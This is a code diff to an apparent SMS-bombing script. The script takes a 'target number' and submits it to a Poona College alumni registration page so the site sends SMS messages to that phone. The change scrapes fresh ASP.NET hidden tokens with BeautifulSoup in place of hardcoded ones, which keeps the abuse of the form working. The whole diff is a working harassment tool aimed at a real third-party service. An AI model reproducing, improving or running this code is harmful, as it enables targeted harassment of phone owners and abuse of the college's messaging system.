@@ -5,6 +5,7 @@ import string
 import logging
 import random
 import string
+from bs4 import BeautifulSoup
 
 number = input("Enter target number : ")
 
@@ -19,19 +20,22 @@ Header = {
 
 def poonaCollege(number):
 	url = "https://akipoona.vriddhionline.com/Alumni_03A_User_Alumni_Register_OCMS2.aspx?DateTime=7%2f17%2f2022+2%3a47%3a03+AM&ID=HVQQN4SH&PID=7Z9TUybxVvWBKoTchhceQpHX%2fEBivdV0USBBKLHKoGjkTqrcX6YXmItFkZwj0EDC"
+	a = requests.get(url, headers=Header).text
+	soup = BeautifulSoup(a, 'html5lib')
+	tags = soup.findAll('input', type='hidden')
 	payload = {
-	'__EVENTTARGET': '',
-	'__EVENTARGUMENT': '',
-	'__VIEWSTATE': 'wxw+Qda6cOb9OCEcOOKeSONlq7uGYJA9SLYK23+aBy+13fPcd814aDiJ8T5X0dgStFPPoe0Z4MqplGgqGIc5HRaQShFzJhqUUnu7tG7UiaY//Ud+GocgeDbChbSGBicoyVhj9+CL3V74SUFQC2q/K76a16wsluxiMNquZVdSGqdPCT0RENv23eUno04aX9G1PIdPTd2bhv/3wdSOcKnWO9K0jmJsBz+LNQgt+mGGBhEE/1MrEh6eBdjIGblWlw2tOKPAJYNblCcKGB82WSmrWv90IL14Rg7u36REq8aIFAqTKzCNI2F4i8lF3d6hmHO/TMq78vCdyK5m0TqJRA6BJXK4aGq2IINdeQYq24jFqZPllHf65C+ButoSBbwi5V8TpDG7HFuFEbijEgjQn8CYfLvd4C7iXuFP9fpLxjkSc92HPuHBpNinZiWGYu2wVy1mL8h8sQ1RH3gH3WhnNOccLPPWCFJAtVTcrfivcc6VKW3tWFiYkGJXZJMf/ERbmS9UVAdZiiCz9a4kMAJVvB9dPXNeFE0iFlj7wT8Arnx3vZr8qvx1HbJXayRB74uXqjX5hxZaJzyuh+9VfgN/SiThvK5axEPVf/HFHNsZJR++553bvwudmNAcvm4/N7FMhqPwpEERCcnUEiX0w4fXhuCMCx3v3/P50c0dDYUxPCJRDQIW45Uwi8cVa4DTmR6kox6cyrTN2wXfG3pwhej99V90F+v2h/spJ1bqSxQghFDi0PrnELpIMeQCssSwyYnNndWTjvN9MIMrQ7KLDP9XvgBxGUB+V5AV9Isc6kXm+8LLpzzMuRGHoLiCnshyDzYxnmG1E01ZoCf7M6zlrDeGriZNqDfVgyOMwW1xK3HL6FwKx41aWJQzqNXRyihwsBTmdloW0Q8nZtttUbLQmDu7bhnd5S9jgzkHmvBHUM0SeGFZFERVF/pAZjb97jYLQIKP5lyTIRo0d1q8p8prIXZ3T5d34YT3AGrn61iagj/PxHpdxB3Isz1IjjI9eIdGFZMpzO/sylLpSyb7J0AUkT3oMv7GLRtFaph8GsRgRN2zPNkel8h85Ap/TFa1mCZlGL3qu65IE0qiKFnf6Zq6xVtnvZpRDuDbKcrwTeF0D+iEP4ZBZc4zu26p4ziO4VUjjYlN4ZL+mC23GROoOLh0ExWsWBrv81yU+vQgtxJBrqSSINxbLSiz35HEwo8+uYmTox9+zVByC/3ywcOoRfDd9Gw9IA35IbuLzEGh2qYbsOJ37ceZ9BSZThRLoPx+9WHE0/9daub9',
-	'__VIEWSTATEGENERATOR': '5973DCBD',
-	'__PREVIOUSPAGE': 'pcOJ73fSeWqZolOHyyP57BrGYVDIChDSTBJyMOSGJKs-k2Up5xTylf2_eQa1zRTO-4IRFOS1KKRwOHC_YOCCirWCdY5oqZh7Ryzhz5UPdfnlcoGiqtSMe70wPXLSGiBm0',
-	'__EVENTVALIDATION': 'h4ftNnwtxXD07lVTCZrGUcayv1ApUC0yjABAuM1Md+jmH2tOQN8u//3noRR1uYpFI0kplcXtBPqWm+Wovh687nATDH9F4pbul0fl2lwXkSUtYIUvuewr1BwbHh1wXKxSwIXHKy9fh7GJowGH6n8FyBEdrvvYA+5VJskzo5zCFKiigPFAprLHxeNTi9WKODA0f8jSbdQxVUqa9vfTivcb62mmE0ZnRS+Tor+ezkY6z4mred/Efb4XwAJxkoG/W3qPtLP8JeLtL/C7qfv85KxS8lFL3w3KosJjqgNrKtMlScx9nV9+6JNb6UAY3VpCyCA0vJmCpV4uaGSx1GQIfyce/BnlEk7PeqMjMUp+yYgtpUd834AvRZVg1xIF1eCLXkqeRUBqpK5UL/6MyDN/T1W16lXIkzvsgTXV9B9HiIRFPqPCv2zB/x+nUrP4wGuwl1Nx',
-	'ctl00$hdnClgID': 'PUNE.POONA_COLLEGE',
-	'ctl00$ContentPlaceHolder1$hdnClgID': 'PUNE.POONA_COLLEGE',
-	'ctl00$ContentPlaceHolder1$txtAlumniMobile': number,
-	'ctl00$ContentPlaceHolder1$txtAlumniEmail': 'testingapi@gmail.com',
-	'ctl00$ContentPlaceHolder1$btnOpr': 'Click to Register'
-}
+		'__EVENTTARGET': '',
+		'__EVENTARGUMENT': '',
+		'__VIEWSTATE': tags[2].get('value'),
+		'__VIEWSTATEGENERATOR': tags[3].get('value') ,
+		'__PREVIOUSPAGE': tags[4].get('value'),
+		'__EVENTVALIDATION': tags[5].get('value'),
+		'ctl00$hdnClgID': tags[6].get('value'),
+		'ctl00$ContentPlaceHolder1$hdnClgID': tags[7].get('value'),
+		'ctl00$ContentPlaceHolder1$txtAlumniMobile': number,
+		'ctl00$ContentPlaceHolder1$txtAlumniEmail': 'new@gmail.com',
+		'ctl00$ContentPlaceHolder1$btnOpr': 'Click to Register'
+	}
 	x = requests.post(url, data=payload, headers=Header)
 	if len(x.text) != 0:
 		print("Sent SMS to ",number)
